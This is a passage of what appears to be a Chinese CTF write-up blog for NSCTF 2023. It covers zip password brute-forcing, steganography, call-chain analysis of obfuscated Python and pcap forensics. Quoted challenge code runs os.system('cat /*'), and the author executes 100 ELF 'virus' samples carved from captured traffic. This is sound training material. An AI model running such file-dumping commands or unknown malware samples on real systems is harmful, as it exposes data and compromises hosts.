title="zip"></a>zip</h2><p>zip注释：<code>The art of 0 and 1, and it will remain shorter than 9.</code></p><p>生成字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    bin_strings = [<span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**i)]<br>    my_dict[i] = bin_strings<br><span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> my_dict.items():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dic.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> value:<br>            f.write(i+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>爆破得到密码<code>01001101</code></p><p>解压得到flag</p><h2 id="SimpleDocument"><a href="#SimpleDocument" class="headerlink" title="SimpleDocument"></a>SimpleDocument</h2><p>图片分离出一个pdf，用pdf编辑器全选，发现有一个隐藏的文本</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/SimpleDocument.png"></p><h2 id="BeautifulImage"><a href="#BeautifulImage" class="headerlink" title="BeautifulImage"></a>BeautifulImage</h2><p>stegsolve分析，0通道藏有base加密字符串</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/BeautifulImage.png"></p><h2 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h2><p>下载附件得到一个<code>tree.py</code>，约有60w行代码</p><p>部分代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># the o mean is 0!</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0aB30386</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o02aA7B4</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">1705</span> &lt; <span class="hljs-number">2926</span>:<br>            tree_b270co58.tree_f79D6eB3(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_51o1oA3a</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_433218o8</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">1793</span> &lt; -<span class="hljs-number">5366</span>:<br>            tree_B813Fe08.tree_AaA1b735(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_2598o3do</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7C0ooB75</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">7226</span> &gt; -<span class="hljs-number">7705</span>:<br>            tree_3482o9ob.tree_0d6aDA0F(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0a351C93</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_39cD9171</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">9865</span> &lt; <span class="hljs-number">592</span>:<br>            tree_Coc29fcC.tree_22E98104(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_170EE546</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_70759F44</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">8714</span> &lt; <span class="hljs-number">4093</span>:<br>            tree_8D0oE9Cf.tree_2F7682e6(self)<br></code></pre></td></tr></table></figure><p>且存在部分函数调用<code>os.system</code>，执行的语句均为<code>cat /*</code></p><p>除了<code>os</code>函数外，其他函数都存在一个<code>if</code>，判断成功时引用下一个类</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> ast<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_91fo80eD</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7040e9o9</span>(<span class="hljs-params">self</span>):<br>       os.system(<span class="hljs-string">&#x27;cat /*&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_88eF054e</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o00o0b68</span>(<span class="hljs-params">self</span>):<br>       tree_91fo80eD.tree_7040e9o9(self)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_1a0c10D0</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_4Cc0o1Do</span>(<span class="hljs-params">self</span>):<br>       tree_88eF054e().tree_o00o0b68(self)<br></code></pre></td></tr></table></figure><p>这段代码的完整利用链为：<br><code>tree_1a0c10D0.tree_4Cc0o1Do() -&gt; tree_88eF054e.tree_o00o0b68() -&gt; tree_91fo80eD.tree_7040e9o9()</code></p><p>所以我们需要分析代码，找到最终触发<code>os.system</code>的利用链，并提取出来</p><p>同时对所有<code>os.system</code>语句标记污点，如果遇到<code>if</code>判断错误的，则直接取消污点标记，并一直往上寻找最终利用链，并记录类名、函数名和函数内的具体内容</p><p>根据提示<code># the o mean is 0!</code>，提取所有完整利用链的类名的后8位十六进制字符，并将o转化为0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> astor<br><br><span class="hljs-comment"># 解析Python文件，获取语法树</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;tree.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>   source_code = file.read()<br>syntax_tree = ast.parse(source_code)<br><br><span class="hljs-comment"># 初始化类名和函数字典</span><br>class_dict = &#123;&#125;<br><br><span class="hljs-comment"># 遍历语法树，获取类和函数名</span><br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> syntax_tree.body:<br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, ast.ClassDef):<br>       class_name = node.name<br>       class_dict[class_name] = &#123;&#125;<br>       <span class="hljs-keyword">for</span> inner_node <span class="hljs-keyword">in</span> node.body:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(inner_node, ast.FunctionDef):<br>               func_name = inner_node.name<br>               class_dict[class_name][func_name] = []<br>               <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> inner_node.body:<br>                   class_dict[class_name][func_name].append(astor.to_source(code).strip())<br><br><span class="hljs-comment"># 输出结果</span><br><br>class_keys = []<br><span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os.system&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(func_dict):<br>       sub = func_dict[<span class="hljs-number">1</span>][<span class="hljs-built_in">list</span>(func_dict[<span class="hljs-number">1</span>].items())[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>       <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       <span class="hljs-keyword">elif</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       class_keys.append(func_dict[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> class_keys:<br>   class_key = key<br>   func_key = <span class="hljs-built_in">list</span>(class_dict[class_key])[<span class="hljs-number">0</span>]<br>   list_class = [class_key]<br>   flag = <span class="hljs-number">1</span><br>   flags = <span class="hljs-number">0</span><br>   <span class="hljs-keyword">while</span> flag != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>       flag = <span class="hljs-number">1</span><br>       flags = <span class="hljs-number">0</span><br>       <span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>           <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> func_dict[<span class="hljs-number">1</span>].items():<br>               <span class="hljs-comment"># print(func_dict[1].items(), flag)</span><br>               <span class="hljs-keyword">if</span> class_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> func_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]:<br>                   sub = code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>                   <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   <span class="hljs-keyword">elif</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   flags = <span class="hljs-number">2</span><br>                   func_key = code[<span class="hljs-number">0</span>]<br>                   class_key = func_dict[<span class="hljs-number">0</span>]<br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   list_class.append(class_key)<br>                   <span class="hljs-comment"># print(list_class)</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-comment"># print(flag, flags)</span><br>           <span class="hljs-keyword">if</span> flag == -<span class="hljs-number">1</span>:<br>               flags = <span class="hljs-number">1</span><br>           <span class="hljs-keyword">if</span> flags == <span class="hljs-number">2</span>:<br>               flags = <span class="hljs-number">0</span><br>               <span class="hljs-keyword">continue</span><br>           <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>               <span class="hljs-keyword">break</span><br>   <span class="hljs-comment"># 将完整利用链的类名，去除tree_，o改为0，按照顺序输出成字符串</span><br>   <span class="hljs-keyword">if</span> flag != -<span class="hljs-number">1</span>:<br>       <span class="hljs-keyword">for</span> cla <span class="hljs-keyword">in</span> list_class:<br>           <span class="hljs-built_in">print</span>(cla[<span class="hljs-number">5</span>:].replace(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>       <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>最终得到两条完整的利用链</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">7468652070617373776f7264206973203730383532613933613336343963613736653335626138353833376566613135<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">377aBCAf271c00041373e10830000000000000006A0000000000000057Acbd47A5c4CDB728a43AF6d91D92D25519Bac7876E97909B633223d3A1d7417A3a741ddAfB0E9A7F0b25C726085149ad1da4D40104060001093000070B0100022406F1070112530f9A96C63163E0Df042FD12EC0b32431902121010001000C2A2600080a017088A4910000050119010011130066006c00610067002e0074007800740000001900140a01008B43f758BE7Ad901150601002000000000000000<br></code></pre></td></tr></table></figure><p>转字符串后发现一个为<code>7z</code>文件，一个为<code>the password is 70852a93a3649ca76e35ba85837efa15</code>，解压得到flag</p><h2 id="hacker-traffic"><a href="#hacker-traffic" class="headerlink" title="hacker_traffic"></a>hacker_traffic</h2><p>在第4615条流中发现flag.zip</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-1.png"></p><p>注释内容：<code>password is (md5(virus_file) + lhost_ip)</code></p><p>同时发现流量中有很多elf文件，使用tshark或者python提取</p><p>这里使用binwalk，但是需要注意部分binwalk版本不能提取elf文件</p><p>需要修改<code>/usr/lib/python3/dist-packages/binwalk/config/extract.conf</code>文件(以kali默认位置为例)</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-2.png"></p><p>共提取出100个elf文件，且每个elf文件运行后都会打印一个md5值</p><p>使用tcpdump监听后运行所有elf文件<br><code>tcpdump -tttt -s0 -X -vv -w t.pcap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用find命令查找当前文件夹下所有的elf文件</span><br>elf_files=$(find . -maxdepth 1 -type f -executable -name &quot;*.elf&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用循环依次执行每一个elf文件</span><br>for file in $elf_files<br>do<br>  echo &quot;Executing $file&quot;<br>  ./$file<br>done<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-3.png"></p><p>分析<code>t.pcap</code>文件，发现只有<code>22E7CF.elf</code>访问了<code>192.168.3.201</code>这个ip</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-4.png"></p><p>将文件md5和地址拼接后解压提示密码错误，是因为tcp传输文件会有冗余，需要计算elf文件的真正大小</p><p>readelf读文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-5.png"></p><p>得到</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">Start of section headers:          14736 (bytes into file)<br>Size of section headers:           64 (bytes)<br>Number of section headers:         30<br></code></pre></td></tr></table></figure><p>参考文章：<a href="https://luomuxiaoxiao.com/?p=139">计算机原理系列之二 ——– 详解ELF文件</a></p><p>计算得到<code>14736+64*30=16656字节</code></p><p>16656即4110(16进制)，将冗余的数据去除</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-6.png"></p><p>计算真正的md5</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-7.png"></p><p>拼接起来，得到<code>0f82ecb23adc35a4a5e3d8bdabbafe15192.168.3.201</code></p><p>解压得到一个py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> secret<br>key = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_flag</span>(<span class="hljs-params">flag, key</span>):<br>    random.seed(key)<br>    table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>    random.shuffle(table)<br>    flag = [flag[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table]<br>    ascii_flag = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag]<br>    random.seed(key)<br>    xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>    encrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ascii_flag]<br>    <span class="hljs-keyword">return</span> base64.b64encode(<span class="hljs-built_in">bytes</span>(encrypted_flag)).decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br><span class="hljs-built_in">print</span>(encrypt_flag(flag, key))<br><span class="hljs-comment"># VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=</span><br></code></pre></td></tr></table></figure><p>伪随机+shuffle生成s盒进行的置换异或加密</p><p>根据<code>key=&quot;x.x.x.x&quot;</code>可知key就是ip地址，为<code>192.168.3.201</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">encrypted_flag, key</span>):<br>   random.seed(key)<br>   table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>   random.shuffle(table)<br>   <span class="hljs-comment"># 解码base64编码的字符串</span><br>   encrypted_flag = base64.b64decode(encrypted_flag.encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><br>   <span class="hljs-comment"># 随机生成一个密钥</span><br>   random.seed(key)<br>   xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br><br>   <span class="hljs-comment"># 对加密后的ASCII码列表进行异或运算</span><br>   decrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> encrypted_flag]<br><br>   <span class="hljs-comment"># 将异或后的ASCII码列表转换成字符列表</span><br>   flag = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> decrypted_flag])<br>   final_flag = [<span class="hljs-number">0</span>]*<span class="hljs-number">38</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(table)):<br>       final_flag[table[i]] = flag[i]<br><br>   <span class="hljs-comment"># 返回解密后的flag字符串</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(final_flag)<br><br>key = <span class="hljs-string">&quot;192.168.3.201&quot;</span><br>text = <span class="hljs-string">&#x27;VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=&#x27;</span><br>flag = decrypt_flag(text, key)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;Query&quot;&gt;&lt;a href=&quot;#Query&quot; class=&quot;headerlink&quot; title=&quot;Query&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="宁波" scheme="https://www.lewiserii.top/tags/%E5%AE%81%E6%B3%A2/"/>
    
  </entry>
  
  <entry>
    <title>hw面试题</title>
    <link href="https://www.lewiserii.top/hw/hw%E9%9D%A2%E8%AF%95%E9%A2%98.html"/>
    <id>https://www.lewiserii.top/hw/hw%E9%9D%A2%E8%AF%95%E9%A2%98.html</id>
    <published>2023-05-15T05:00:00.000Z</published>
    <updated>2023-07-12T08:17:09.186Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="54255f22429b4db3602c3a34c566cfc40a3b1912bb8cd0b8adefd1f366628b59">c37edc3dc388221caed397fda20028d36daa6dd1ff1b84bf39c2e63ab44a02e59ee735051a450fd837e89d87cc323c94e30a690fac6bcedd847ae5f62950a31a717f8b51d3dc9a3bf238cecff73ca72c2c5a246425080e80af109f9463fd8c8e48720f34c71d7e7be8c89c02ccc101b1d31d963ad3a2319ae0999e3ed02826a0de7e211d808d8b38aed3208e7cbbefa3142a2cb31557cb42c3d3aabfaf73a62586198bca5e91ad57cc5327555b60b4bb11b132a3c96bc6444b831a21271b8abf5d4dc589c1ae642f97212045c5ecf8978f216ccdd86d631ecaa16af5c6ebca335d256f679d7f8d7acb8ba3f162a30a448d293feb86186480fa1b249e632dee9a09cee3b9ede7f0e25bb951db6cd7dc7d9ff5f2f98656dc39b2ae6b41443330c80505ffe8f9d3f5fc4f66afc28660b5e7378f723179cd54e38602c5b613ed43e2b584a6307d56521898750d4a6ac6958eb36b8557bdc3b1ba14cb430239c763014a37a9abf2ee546f23d05b9a70179199f9c5e4b1a880ca02bd39f2472d50602afe730dd8ef26abe40bd4c63c137eb33102540200112fa4c433970918af69efc93a4d246e517adc72650b6cf3f4ab27e7b47e0f9114d07d595fcf87b559f184e8d475a179e539f8cf67298f99d153a5d29e254430f252f44d34fcb4561a902f959045f1bfb8b87f511ed98625ede3f3bf3efead35bea2ed4da31bf33feff338f85eca82dfe5367c0993eee5cd07e85ce45a5ca3bd9b12e0dcce1ddf09cac47b96e81ae3401ad424df9a53aa5abf21418466e9cedfec248256dc332df16b9121d1d1e480f264cacb1d51b4a70248a1529882cb05d4997566f00c6afd2e10db2207e3ce54a52aaa8ceb9d3ddf457629754b4502ff511023fc9e505c59d0731f07ecd6590587b24cb06c7388646341660e576fa65c4b3868c3e774942c5791a2da435a167fc7eb1ce3a8302c9534b02022c4a85c1874b625524cce3dd3ac3debe7d26ab510d1852e29d6bdbe8132fc81fff648397ee7e29c0fc83921e17eada1e49a5b92430048f3517d587a793744979b0168b9bb98fb488ba1dbbf47df858c9ccddb01af7854da7c4a3fb583332f7402777574edb4ea846df6c59b6c879775ea8f09b3d86e3221836690605c9a3bde4c200bf655e500990e1c8591c11a52d48534990a09ce6be67f8f5961ef21818a2e259a4e5be6b3d0411f72a47aa5f14ef873a4d424e1a5ed9a8665ceda9f75fbf461b0a427cddbdef9868b5beed2a1034045f57928d858f2073b83da63411c0d9c236aded1c6a198017ce6c3a9456ca456847d57e014d6de63843e2f66d030696cb25a917b6b0ffd249a78dc6b1370796dcf090f4c2876b7affaf6849899eb9d1b5dd1df2ed45cf432394cba721f24c6a5d0b5de8dfa2330b7038035519d9c95da9c1dabe14b28a801608b9001f32d7229595e2f9a995bb5954d8ccce34ba78fcb123dfdb68f3ed8bb613896d0f4bf72934d4b53d7898d8ce62ec5522803ef7a8bbf35da2265cbea4af1cf1e633851510d0810d61a89034905e70f14c0e62bca69322e6f3aedb597e7746964dfcc0abd71aa2f5c1dc7c62ccf5c66559e8a87783078e6ce760a1eb8c46a3ac087d74ff60fff060151e4cb7fd8afe97a2b2463d077b240ab498583a351fb5bb5c71c8bc6db84e36bf07d5e7d7faf63bf0e9706389be6e9c7d42f993f0d581f7715340365065c4216d2665321dd029999567f476f4ea8c1f9ecc3ba9eaced969e041935f5ad2037c92631c2f4ff97ad742d12e413fc2a7c373a1a99f99943e71de1a455d7f2e63ad18d8501e897a31b5731ab15a1a98afde00ef7b603dfa4ecea3d7bfcb0b5a8dff29a584eaca3f46e9dbeccf20737a0e71b5ddbd90a5a466b8c9d8e242eb4b5e6122e39253a795dd0f415cb58eb4762520d3c8616e454550d7c77203f51b93b386784cb7badfdfacc1246a4af58b16a17763c374f56095780f0cc1f5c989d5142e35614e713923b658d85fffd8dd6a6790213172484472e4ed89da39b03a04a39f18e9b40f8a95ab9331555deffb7a2ac239d8668d53323093ac3edaa3fe62866f7570853467e84b51e94f6b8ca7319a320dd584e356ecfd4bd5e7e37a5065eee1667416d7a29aaf62521fa46ea558fe90ad8c177314d41c147bca0938b86560154408e366758fa51bc4fa662c40d0f574e24af0588537d9589b928e880a826ab4ace574d301345185e89807e42b0c6694b66d87b012a33daf4dd4fa1898d5b5a417990436c0a5f185d8e41b47311c934102a9d4bbd5ed25375c5957c4808b3c62f7406d4241a5284f3623afb99d6e2bc10cd149325541ca71ec1587b4bf7a0